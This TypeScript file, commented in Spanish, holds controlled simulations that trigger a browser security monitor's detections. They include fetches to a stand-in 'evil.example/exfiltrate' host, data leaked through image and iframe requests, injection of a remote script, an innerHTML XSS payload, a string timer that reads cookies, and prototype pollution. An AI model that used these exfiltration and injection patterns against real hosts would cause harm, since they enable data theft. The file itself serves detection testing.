// Comportamientos controlados e inofensivos para provocar hallazgos.
// Ninguna simulación envía datos reales: los dominios usados no existen.

type Mutable = Record<string, unknown>;

const OriginalSetTimeout = window.setTimeout;

function Ignore(): void {
  // Los errores de red son esperados: los dominios de prueba no existen.
}

export const Simulations: Record<string, () => void> = {
  "allowed-fetch": () => {
    void fetch("/").catch(Ignore);
  },

  "external-fetch": () => {
    void fetch("https://unknown-tracker.example/collect?session=demo", { method: "POST" }).catch(
      Ignore,
    );
  },

  "blocked-fetch": () => {
    void fetch("https://evil.example/exfiltrate").catch(Ignore);
  },

  websocket: () => {
    const socket = new WebSocket("wss://socket.unknown.example/live", ["chat"]);
    socket.addEventListener("error", Ignore);
    socket.close();
  },

  "dynamic-script": () => {
    const script = document.createElement("script");
    script.src = "https://cdn.unknown.example/library.js";
    script.async = true;
    script.addEventListener("error", () => script.remove());
    document.head.appendChild(script);
  },

  "inline-script": () => {
    const script = document.createElement("script");
    // type="text/plain" evita que el navegador lo ejecute.
    script.type = "text/plain";
    script.textContent = "console.log('injected')";
    document.body.appendChild(script);
    script.remove();
  },

  csp: () => {
    // La CSP de index.html solo permite imágenes propias: esta carga se bloquea.
    const image = new Image();
    image.src = "https://images.unknown.example/pixel.png";
  },

  prototype: () => {
    (Object.prototype as Mutable).polluted = true;
  },

  runtime: () => {
    window.setTimeout = function setTimeout(...args: Parameters<typeof OriginalSetTimeout>) {
      return OriginalSetTimeout(...args);
    } as typeof window.setTimeout;
  },

  "exfil-image": () => {
    // Patrón típico: los datos viajan en la query de una imagen hacia otro origen.
    new Image().src = `https://pixel.unknown.example/p.gif?d=${"x".repeat(120)}`;
  },

  "exfil-iframe": () => {
    // Evasión clásica: usar el fetch de un iframe vacío. BrowserGuard lo observa igual.
    const frame = document.createElement("iframe");
    frame.style.display = "none";
    document.body.appendChild(frame);
    void frame.contentWindow?.fetch("https://collector.unknown.example/leak").catch(Ignore);
    frame.remove();
  },

  "xss-innerhtml": () => {
    // Payload clásico; el src inválido dispara onerror, que solo escribe en consola.
    const container = document.createElement("div");
    container.innerHTML = `<img src="x" onerror="console.info('XSS payload executed')">`;
    document.body.appendChild(container);
    container.remove();
  },

  "xss-timer": () => {
    // Código como string (equivalente a eval): inofensivo, pero el patrón es un sink.
    setTimeout("console.info('string timer executed, cookies:', document.cookie.length)", 0);
  },

  crawler: () => {
    // Barrido secuencial de ids, típico de un scraper que recorre un catálogo.
    void (async () => {
      for (let id = 1; id <= 12; id++) {
        await fetch(`/product/${id}`).catch(Ignore);
      }
    })();
  },

  synthetic: () => {
    // Eventos generados por script (isTrusted === false), como los de algunos bots.
    for (let i = 0; i < 15; i++) {
      document.body.dispatchEvent(new MouseEvent("click", { bubbles: true }));
    }
  },

  cleanup: () => {
    delete (Object.prototype as Mutable).polluted;
    window.setTimeout = OriginalSetTimeout;
  },
};
